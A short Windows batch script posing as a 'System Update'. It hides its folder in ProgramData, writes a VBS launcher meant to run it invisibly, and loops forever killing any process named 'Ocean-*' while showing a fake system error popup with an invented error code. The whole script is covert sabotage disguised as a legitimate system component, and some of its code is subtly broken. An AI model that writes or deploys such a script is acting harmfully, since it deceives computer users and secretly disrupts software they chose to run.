@echo off
title System Update
color 0A
echo System Process Monitoring...
echo.
echo Running in background...
echo.

:: Define hidden folder & files
set "VBSPath=C:\ProgramData\SystemUpdater"
set "VBSFile=%VBSPath%\run_hidden.vbs"
set "ErrorVBS=%VBSPath%\error_popup.vbs"

:: Ensure the folder exists
if not exist "%VBSPath%" mkdir "%VBSPath%"

:: Ensure VBS scripts exist
if not exist "%VBSFile%" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%VBSFile%"
    echo WshShell.Run "%~f0", 0, False >> "%VBSFile%"
    echo VBS script generated at %VBSFile%
)

if not exist "%ErrorVBS%" (
    echo MsgBox "System Error: Critical process termination detected." ^& vbCrLf ^& "Error Code: 0xC0000142", 16, "Application Error" > "%ErrorVBS%"
)

:: Hide the folder (optional)
attrib +h "%VBSPath%" /s /d

:loop
:: Check if any Ocean process exists
for /f "tokens=1 delims=," %%A in ('tasklist /fo csv /nh ^| findstr /i "Ocean-"') do (
    set "process=%%~A"
    echo Detected: %process% - Waiting 10 seconds before termination...
    timeout /t 10 >nul
    taskkill /f /im "%process%" >nul 2>&1
    wmic process where "name like 'Ocean-%%'" delete >nul 2>&1
    echo %process% has been closed.

    :: Show error pop-up
    wscript.exe "%ErrorVBS%"
)

timeout /t 2 >nul
goto loop
